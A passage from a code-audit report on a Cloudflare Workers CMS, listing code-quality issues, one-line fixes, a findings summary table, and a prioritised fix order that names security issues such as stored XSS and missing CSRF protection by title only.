### CQ-01 · HTML string building instead of a template engine
- **File:** All files under `src/views/`
- **Severity:** Low
- **Description:** Every page is built by concatenating HTML strings with template literals. This makes escaping easy to forget (see S-03), makes the markup hard to read and diff, and means there are no compile-time checks on HTML structure. The pattern already requires careful use of `escapeHtml` / `escapeAttr` everywhere.
- **Proposed fix:** This is a large refactor; flag it for a future milestone. Consider adopting `hono/html` tagged template helpers (already a dependency) which provide auto-escaping without requiring a full JSX runtime.

---

### CQ-02 · `src/routes/admin/posts.ts` is ~400 lines handling list, create, edit, delete, toggle, images
- **File:** `src/routes/admin/posts.ts`
- **Severity:** Low
- **Description:** All post admin logic lives in one file. The file handles: listing posts, rendering the new/edit form, saving/validating a post, toggling published state, deleting, and the `replaceImages` R2 upload helper. This makes the file difficult to scan and individual functions hard to test in isolation.
- **Proposed fix:** Split into `posts/list.ts`, `posts/form.ts`, `posts/save.ts`, and `posts/helpers.ts`. No logic changes — pure extraction. This is low-priority cosmetic work, not a bug.

---

### CQ-03 · No TypeScript strict mode
- **File:** `tsconfig.json`
- **Severity:** Medium
- **Description:** The project does not enable `"strict": true` in `tsconfig.json`. This means implicit `any`, unchecked `null` access, and loose function signatures are all silently accepted. Several of the bugs in this audit (e.g. unescaped strings, unchecked nulls) would be flagged as type errors under strict mode.
- **Proposed fix:** Enable `"strict": true` and fix the resulting type errors incrementally. This is a multi-PR effort; start with `"strictNullChecks": true` as the highest-value individual flag.

---

### CQ-04 · `loadSettings` called on every request with no in-memory cache
- **File:** `src/lib/defaults.ts:loadSettings`
- **Severity:** Medium
- **Description:** `loadSettings` runs `SELECT * FROM settings` on every single request (every page load, every admin action). Cloudflare Workers are stateless, so there is no inter-request cache, but within a single request the function is often called more than once (e.g. in middleware and again in the route handler).
- **Proposed fix:** Store the settings result in the Hono context (`c.set("settings", ...)`) in the tenant middleware so it is loaded once per request and reused. Optionally add a Cloudflare KV cache layer with a 60-second TTL for settings reads.

---

### CQ-05 · Error responses are inconsistent — some JSON, some HTML
- **File:** `src/worker.ts:onError`, multiple route handlers
- **Severity:** Low
- **Description:** The global `app.onError` handler returns `c.json({error: "..."})`. Some route handlers return `c.html(errorPage(...))`. The admin dashboard error function returns a full standalone HTML page. API endpoints that encounter errors may return HTML error pages, which breaks JSON clients.
- **Proposed fix:** Add a content-type check in the error handler: if `Accept` header contains `application/json` or the path starts with `/api/`, return JSON; otherwise return HTML. Standardise the admin error format across all route handlers.

---

### CQ-06 · `formatDate` has no locale or timezone parameter
- **File:** `src/lib/utils.ts:formatDate`
- **Severity:** Low
- **Description:** `formatDate` always uses the Cloudflare Worker's default locale and timezone (UTC), so dates displayed in the admin ("Created: May 18 2026") are always UTC regardless of the site's configured timezone. A user in UTC+8 who published at 9 PM local time sees "May 17" in the admin.
- **Proposed fix:** Pass the site's `timezone` setting into `formatDate` and use `Intl.DateTimeFormat` with the `timeZone` option. The setting already exists; it just is not plumbed through to the display layer.

---

### CQ-07 · `csrfMatch` is dead code — defined but never called
- **File:** `src/lib/auth.ts:csrfMatch`
- **Severity:** Medium
- **Description:** The `csrfMatch` function implements a timing-safe comparison for CSRF tokens but is never imported or called anywhere in the codebase. It represents an incomplete security feature that gives false confidence (the name implies CSRF protection exists) while providing none.
- **Proposed fix:** Either wire it up (see S-02) or delete it and add a comment in a future task tracker. Dead code is confusing; a function named `csrfMatch` that is never called is particularly misleading.

---

## 8. One-Line Changes

**5 findings** — each is a single-line fix with clear impact.

### OL-01 · Add `Sitemap:` directive to `robots.txt`
- **File:** `src/routes/frontend/robots.ts` (or equivalent)
- **Severity:** Medium
- **Description:** Append one line — `Sitemap: https://${hostname}/sitemap.xml` — to the generated `robots.txt`. Immediately tells all search engines where the sitemap lives. No logic change; no new dependencies.

---

### OL-02 · Change `api_logs` FK to `ON DELETE SET NULL`
- **File:** `src/schemas/site.sql`
- **Severity:** High
- **Description:** Change `FOREIGN KEY (api_key_id) REFERENCES api_keys(id) ON DELETE CASCADE` to `ON DELETE SET NULL`. Preserves log rows when a key is deleted. Requires a schema migration for existing sites (ALTER TABLE or re-create).

---

### OL-03 · Fix category canonical URL to use `buildCategoryPath`
- **File:** `src/routes/frontend/category.ts:49`
- **Severity:** High
- **Description:** Replace `` `https://${hostname}/${category.slug}/` `` with `` `https://${hostname}${buildCategoryPath(category.slug, settings)}` ``. One substitution; fixes incorrect canonical URLs for sites with a custom `category_base`.

---

### OL-04 · Add `footer_show_built_with` default setting
- **File:** `src/lib/defaults.ts`
- **Severity:** Low
- **Description:** Add `footer_show_built_with: "true"` to the `DEFAULT_SETTINGS` object. One line addition. Then guard the branding line in the layout with `settings.footer_show_built_with !== "false"`. Enables white-labelling without a source code change.

---

### OL-05 · Use `c.executionCtx.waitUntil` for `trackRedirectHit`
- **File:** `src/routes/frontend/` (wherever `trackRedirectHit` is called)
- **Severity:** Low
- **Description:** Change the bare call `trackRedirectHit(siteDb, id)` to `c.executionCtx.waitUntil(trackRedirectHit(siteDb, id))`. One word addition. Ensures the async DB write completes before the Worker is terminated after the response is sent.

---

## Summary

| Section | Findings |
|---|---|
| 1. Bugs | 12 |
| 2. Security Issues | 8 |
| 3. SEO Completeness | 14 |
| 4. CTR & Conversion | 9 |
| 5. Automation / API Gaps | 8 |
| 6. Admin UX | 8 |
| 7. Code Quality | 7 |
| 8. One-Line Changes | 5 |
| **Total** | **71** |

### Priority order for fixes

1. **S-01** (CORS any-origin + credentials) — critical; fix before next deploy
2. **S-03** (stored XSS via post content) — critical; fix before next deploy
3. **S-02** (no CSRF protection) — high; fix within 1 sprint
4. **S-04** (API key in URL) — high
5. **S-05** (network admin key in URL) — high
6. **B-03** (audit logs deleted with key) — high
7. **SEO-13** (no JSON-LD Article schema) — high impact on organic search
8. **SEO-07** (categories missing from sitemap) — high impact on crawl coverage
9. **OL-03** (category canonical URL bug) — one-line fix, high SEO impact
10. All remaining medium/low findings in any order
